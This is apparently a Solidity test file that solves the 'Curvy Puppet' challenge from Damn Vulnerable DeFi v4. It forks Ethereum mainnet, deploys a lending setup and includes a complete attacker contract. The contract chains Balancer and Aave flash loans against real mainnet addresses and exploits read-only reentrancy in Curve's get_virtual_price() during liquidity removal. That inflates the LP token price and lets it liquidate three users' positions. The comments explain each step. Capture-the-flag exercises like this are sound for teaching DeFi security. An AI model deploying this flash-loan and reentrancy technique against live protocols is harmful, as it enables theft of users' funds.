// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(AttackData({
            weth: weth,
            stETH: stETH,
            dvt: dvt,
            lending: lending,
            curvePool: curvePool,
            permit2: permit2,
            alice: alice,
            bob: bob,
            charlie: charlie,
            treasury: treasury,
            TREASURY_WETH_BALANCE: TREASURY_WETH_BALANCE,
            USER_BORROW_AMOUNT: USER_BORROW_AMOUNT
        }));

        // The attacker withdraws WETH from the treasury to cover the flash loan fees.
        // Additionally, LP tokens are withdrawn to repay the borrowed amounts on behalf of the users.
        weth.transferFrom(treasury, address(attacker), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), TREASURY_LP_BALANCE);

        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] memory  assets,
        uint256[] memory amounts,
        uint256[] memory modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

struct AttackData {
    WETH weth;
    IERC20 stETH;
    DamnValuableToken dvt;
    IStableSwap curvePool;
    CurvyPuppetLending lending;
    IPermit2 permit2;
    address alice;
    address bob;
    address charlie;
    address treasury;
    uint256 TREASURY_WETH_BALANCE;
    uint256 USER_BORROW_AMOUNT;
}

contract Attacker {
    AttackData private $;

    address private immutable balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private immutable aave = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address private immutable aaveInterestBearingStETH = 0x1982b2F5814301d4e9a8b0201555376e62F82428;

    uint256 private constant ETH_VIRTUAL_PRICE_GOAL = 51300e18;
    bool private hasReceiveBeenCalled = false;

    constructor(AttackData memory attackData) {
        $ = attackData;
    }

    function attack() external {
        // The lending pool uses IStableSwap::get_virtual_price() to determine the price of the LP token.
        // By increasing this price, users will appear overcollateralized, allowing us to invoke
        // CurvyPuppetLending::liquidate().
        //
        // To manipulate the LP token price, we exploit a read-only reentrancy vulnerability in get_virtual_price().
        // If one of the assets in the pool is ETH, adding liquidity and then immediately removing it triggers
        // a call to this contract's receive() or fallback() function.
        // This allows us to call get_virtual_price() before the value is properly updated, enabling the use
        // of the manipulated price.
        // For reference, see: https://www.chainsecurity.com/blog/curve-lp-oracle-manipulation-post-mortem
        //
        // However, we lack sufficient funds to cause a significant price change with this technique alone.
        // Therefore, we use flash loans to amplify the attack.
        //
        // We choose Balancer as it doesn't charge fees for lending WETH, so we borrow the maximum amount possible.
        // https://docs.balancer.fi/reference/contracts/flash-loans.html
        // Flow continues at Attacker::receiveFlashLoan()
        address[] memory tokens = new address[](1);
        tokens[0] = address($.weth);

        uint256[] memory amountsToBorrow = new uint256[](1);
        amountsToBorrow[0] = $.weth.balanceOf(balancer);

        IBalancerVault(balancer).flashLoan(address(this), tokens, amountsToBorrow, "");

        // We are back from Attacker::receiveFlashLoan()
        // Closing operations, send all your funds to treasury.
        $.weth.transfer($.treasury, $.weth.balanceOf(address(this)));
        IERC20($.curvePool.lp_token())
            .transfer(
                $.treasury,
                IERC20($.curvePool.lp_token()).balanceOf(address(this)
            )
        );
        $.dvt.transfer($.treasury, $.dvt.balanceOf(address(this)));
    }

    // Receives the flash loan from Balancer
    // https://docs.balancer.fi/reference/contracts/flash-loans.html
    function receiveFlashLoan(
        IERC20[] calldata,
        uint256[] calldata borrowedAmounts,
        uint256[] calldata,
        bytes calldata
    ) external {
        // The WETH borrowed from Balancer is insufficient to manipulate the liquidity pool's price.
        // To further influence the price, we will borrow WETH and stETH from AAVE using a flash loan.
        // Reference:
        // - AAVE Flash Loan Guide: https://docs.aave.com/developers/2.0/guides/flash-loans
        // - AAVE Deployed Contracts: https://docs.aave.com/developers/2.0/deployed-contracts/deployed-contracts
        //
        // Through empirical testing (refer to CurveVirtualPrice.t.sol), we determined that
        // the target virtual price can be achieved with a pair ratio of 51,300e18 ETH to 173,429e18 stETH.
        address[] memory tokens = new address[](2);
        tokens[0] = address($.stETH);
        tokens[1] = address($.weth);

        uint256[] memory amountsToBorrow = new uint256[](2);
        amountsToBorrow[0] = $.stETH.balanceOf(aaveInterestBearingStETH);
        amountsToBorrow[1] = ETH_VIRTUAL_PRICE_GOAL - ($.weth.balanceOf(address(this)) - $.TREASURY_WETH_BALANCE);

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        IAaveFlashloan(aave).flashLoan(address(this), tokens, amountsToBorrow, modes, address(this), "", 0);

        // Returning from Attacker::executeOperation()
        // The next step is to repay the borrowed WETH to Balancer.
        // To achieve this, we will combine the following sources:
        // - WETH from the treasury.
        // - Additional ETH obtained by swapping stETH.
        // - The ETH we already have.
        // The flow now returns to Attacker::attack().
        uint256 wethToExchange = borrowedAmounts[0] - address(this).balance - $.TREASURY_WETH_BALANCE;
        $.stETH.approve(address($.curvePool), wethToExchange * 1000 / 999);
        $.curvePool.exchange(1, 0, wethToExchange * 1000 / 999, wethToExchange);

        $.weth.deposit{value: address(this).balance}();
        $.weth.transfer(balancer, borrowedAmounts[0]);
    }

    // Receives the flash loan from AAVE.
    // Reference: https://vscode.blockscan.com/ethereum/0x02D84abD89Ee9DB409572f19B6e1596c301F3c81
    function executeOperation(
        address[] calldata,
        uint256[] calldata borrowedAmounts,
        uint256[] calldata fees,
        address,
        bytes calldata
    ) external returns (bool) {
        // This is the core of the exploit: liquidity is added and then removed to exploit
        // the temporarily inflated LP token price when the contract's receive() function is triggered.
        // Local variables are introduced for better readability and clarity.
        // Note: all borrowed WETH has been converted into ETH prior to this step.
        // Flow continues in Attacker::receive().
        uint256 wethBalance = $.weth.balanceOf(address(this)) - $.TREASURY_WETH_BALANCE;
        uint256 stETHBalance = $.stETH.balanceOf(address(this));

        $.weth.withdraw(wethBalance);
        $.stETH.approve(address($.curvePool), stETHBalance);

        uint256 lps = $.curvePool.add_liquidity{value: wethBalance}([wethBalance, stETHBalance], 0);
        $.curvePool.remove_liquidity(lps, [uint256(0), uint256(0)]);

        // Returning from Attacker::receive(), proceed to acquire stETH using ETH
        // (withdrawn from WETH) transferred from the treasury.
        // Since stETH is currently cheaper than ETH, we input the required ETH amount,
        // expecting to receive an equivalent amount of stETH, with a potential surplus.
        // To finalize the flash loan, we approve AAVE to withdraw the loaned stETH.
        // Flow returns to Attacker::receiveFlashLoan().
        uint256 stETHtoRepay = borrowedAmounts[0] + fees[0];
        uint256 stETHNeeded = stETHtoRepay - $.stETH.balanceOf(address(this));
        $.curvePool.exchange{value: stETHNeeded}(0, 1, stETHNeeded, stETHNeeded);
        $.stETH.approve(aave, stETHtoRepay);

        uint256 wethToRepay = borrowedAmounts[1] + fees[1];
        $.weth.deposit{value: wethToRepay}();
        $.weth.approve(aave, wethToRepay);

        return true;
    }

    receive() external payable {
        // The WETH::withdraw() function sends ETH to the caller using the low-level transfer() function,
        // which only forwards 2300 gas to the receiving contract, limiting its execution scope.
        // For more details, refer to the WETH contract at:
        // https://vscode.blockscan.com/ethereum/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
        // Additionally, we only want receive() to be called only once by curvePool.
        if (msg.sender != address($.curvePool) || hasReceiveBeenCalled) return;
        hasReceiveBeenCalled = true;

        // We issue the liquidation of the users here.
        // Since Permit2 is used, an approval is granted for the lending contract to utilize these LP tokens.
        // Flow goes back to Attacker::executeOperation()
        IERC20($.curvePool.lp_token()).approve(address($.permit2), 3 * $.USER_BORROW_AMOUNT);
        $.permit2.approve({
            token: $.curvePool.lp_token(),
            spender: address($.lending),
            amount: uint160(3 * $.USER_BORROW_AMOUNT),
            expiration: uint48(block.timestamp)
        });

        $.lending.liquidate($.alice);
        $.lending.liquidate($.bob);
        $.lending.liquidate($.charlie);
    }

    function queryBalances(string memory situation) private view {
        console.log(situation);
        console.log("\tETH", address(this).balance);
        console.log("\tstETH", $.stETH.balanceOf(address(this)));
        console.log("\tWETH", $.weth.balanceOf(address(this)));
        console.log("\tDVT", $.dvt.balanceOf(address(this)));
    }
}
